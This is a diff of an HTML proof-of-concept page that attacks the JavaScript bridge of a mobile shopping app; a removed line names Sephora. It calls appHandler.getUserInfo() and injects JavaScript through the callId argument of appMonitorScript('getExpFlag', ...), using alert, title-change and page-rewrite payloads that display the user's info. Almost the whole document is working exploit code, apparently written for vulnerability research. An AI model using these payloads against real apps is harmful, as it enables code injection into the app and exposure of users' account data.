@@ -5,38 +5,43 @@
 <title>PoC</title>
 <style>
 body{background:#0d0d0d;color:#fff;font-family:monospace;padding:20px;font-size:14px}
-.ok{color:#00c853}.err{color:#ff5252}.info{color:#c9a96e}
+.ok{color:#00c853}.info{color:#c9a96e}
 </style>
 </head>
 <body>
-<h3 style="color:#c9a96e">JSBridge PoC</h3>
+<h3 style="color:#c9a96e">JSBridge callId Injection PoC</h3>
 <div id="log"></div>
 <script>
 function L(s,c){document.getElementById('log').innerHTML+='<div class="'+(c||'')+'">'+s+'</div>'}
 
 if(typeof appHandler==='undefined'){
-  L('NO BRIDGE - not in sephora app','err');
+  L('NO BRIDGE','err');
 }else{
   L('bridge: YES','ok');
-  L('origin: '+location.origin,'info');
-
-  // 1. getUserInfo (direct)
   var u=appHandler.getUserInfo();
-  L('getUserInfo(): "'+u+'"','ok');
+  L('getUserInfo: "'+u+'"','ok');
 
-  // 2. simple callId injection (just alert - proven to work)
-  L('calling getExpFlag with injected callId...','info');
+  // Test 1: alert (proven to work)
+  L('sending test1 (alert)...','info');
   appHandler.appMonitorScript('getExpFlag',
-    "0);alert('INJECTED: user='+appHandler.getUserInfo());//",
-    '{"expKey":"test"}');
-  L('call sent','info');
+    "0);alert('user='+appHandler.getUserInfo());//",
+    '{"expKey":"a"}');
 
-  // 3. also try with document.title (simplest DOM change)
+  // Test 2: document.title (very simple DOM change)
   setTimeout(function(){
+    L('sending test2 (title)...','info');
     appHandler.appMonitorScript('getExpFlag',
-      "0);document.title='HACKED_BY_CALLID';document.body.innerHTML+='<div style=\"position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:red;color:white;padding:30px;font-size:20px;border-radius:15px;z-index:99999\">CALLED INJECTION SUCCESS<br>getUserInfo: '+appHandler.getUserInfo()+'</div>';/",
-      '{"expKey":"test"}');
-  },1500);
+      "0);document.title='PWNED_BY_CALLID';//",
+      '{"expKey":"b"}');
+  },1000);
+
+  // Test 3: background color change (no HTML, no innerHTML)
+  setTimeout(function(){
+    L('sending test3 (bgcolor)...','info');
+    appHandler.appMonitorScript('getExpFlag',
+      "0);document.body.style.background='#cc0000';document.body.style.color='#fff';document.body.innerHTML='CALLID INJECTION SUCCESS<br>getUserInfo='+appHandler.getUserInfo();//",
+      '{"expKey":"c"}');
+  },2000);
 }
 </script>
 </body>
